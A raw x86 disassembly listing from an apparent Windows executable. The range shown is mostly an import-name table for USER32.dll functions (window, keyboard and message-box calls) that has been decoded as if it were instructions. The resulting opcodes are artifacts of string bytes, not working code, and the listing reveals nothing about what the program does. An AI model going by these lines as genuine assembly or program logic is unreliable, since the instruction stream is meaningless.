  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
